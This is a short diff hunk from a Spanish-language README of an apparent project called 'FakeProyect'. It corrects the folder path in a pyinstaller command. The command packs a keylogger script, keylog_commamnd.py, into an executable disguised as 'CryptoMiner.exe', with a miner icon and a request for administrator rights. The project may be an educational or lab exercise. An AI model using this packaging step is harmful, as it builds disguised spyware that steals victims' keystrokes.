@@ -148,7 +148,7 @@ Recurso ---> https://cyberchef.org/
 
       Para Generar el .exe ejecutaremos el siguente comando en la carpte "Client":
 ---
-      D:\FakeProyect\server> pyinstaller --onefile --clean -n CryptoMiner.exe --uac-admin --icon=minericon.ico keylog_commamnd.py
+      D:\FakeProyect\client> pyinstaller --onefile --clean -n CryptoMiner.exe --uac-admin --icon=minericon.ico keylog_commamnd.py
 ---
 # Proximamente!
 
